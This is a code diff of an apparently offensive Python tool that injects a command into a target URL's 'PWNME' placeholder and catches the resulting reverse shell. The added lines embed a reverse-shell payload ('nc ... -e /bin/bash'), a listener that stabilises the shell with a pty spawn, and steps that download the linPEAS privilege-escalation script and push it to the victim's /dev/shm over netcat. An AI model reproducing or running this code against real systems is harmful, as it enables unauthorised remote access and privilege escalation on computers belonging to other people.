@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
 #coding=utf-8
-import sys
-import signal
 import netifaces
 import base64
 import os
@@ -10,8 +8,9 @@ import nclib
 from threading import Thread
 import ipaddress
 import urllib3
-import json
 import requests
+import http.server
+import socketserver
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -64,12 +63,12 @@ def main():
 	######################################################################
 
 def info():
-	print('[+]LOCAL IP ADDRESS : %s'%ip)
-	print('[+]LOCAL PORT : %s'%port)
-	print('[+]TARGET URL : %s'%domain)
+	print('[*]LOCAL IP ADDRESS : %s'%ip)
+	print('[*]LOCAL PORT : %s'%port)
+	print('[*]TARGET URL : %s'%domain)
 	if authentication:
-		print('[+]USERNAME : %s'%authentication[0])
-		print('[+]PASSWORD : %s'%authentication[1])
+		print('[*]USERNAME : %s'%authentication[0])
+		print('[*]PASSWORD : %s'%authentication[1])
 	print('\n#Waiting for a Connection ....')
 
 
@@ -88,20 +87,35 @@ def is_valid():  #Checking if the ip address is valid
 		print("\n[!]Invalid IP : "+ip)
 		exit_gracefully()
 
-def listener(): #setting up the nc listener
+def listener(): #setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
 	nc = nclib.Netcat(listen=('', port))
+	os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null')
+	nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
+	nc.send_line(b'echo $SHELL')
+	send = f'''nc {ip} 9002 > /dev/shm/linpeas.sh'''
+	nc.send_line(send.encode("utf-8"))
 	nc.interact()
 	nc.close()
 
+def http_server():
+	Handler = http.server.SimpleHTTPRequestHandler
+	with socketserver.TCPServer(("", 9002), Handler) as httpd:
+		pass
+
 def thread():
-	t_listen=Thread(target=listener)
-	t_send=Thread(target=send_payload)
-	t_listen.daemon=True
-	t_send.daemon=True
-	t_listen.start()
-	t_send.start()
-	t_listen.join()
-	t_send.join()
+	listen=Thread(target=listener)
+	sendpayload=Thread(target=send_payload)
+	httpserver=Thread(target=http_server)
+	listen.daemon=True
+	sendpayload.daemon=True
+	httpserver.daemon=True
+	listen.start()
+	sendpayload.start()
+	httpserver.start()
+	httpserver.join()
+	listen.join()
+	sendpayload.join()
+
 
 def send_payload():
 	if method == 'post':
@@ -113,13 +127,13 @@ def send_payload():
 		return False
 
 def req_post():
-	payload=''
+	payload=f'nc localhost 9001 -e /bin/bash'
 	url = domain.replace('PWNME',payload) #payoad will be the revshells
 	proxies={'http':'http://127.0.0.1:8080'}
 	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'} #Don't Change*
 	cookies=''
 	#data_parsed=data.replace("PWNME",payload) #Don't change it works perfectly
-	r=requests.post(url,headers=headers)
+	r=requests.post(url)
 
 def req_get():
 	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
@@ -146,3 +160,5 @@ if __name__ == '__main__':
 #Add login form with a session
 #Add customization for cookies & Headers
 #Add the payload generator
+#Add an exit message to break instead of errors
+#Mandatory method
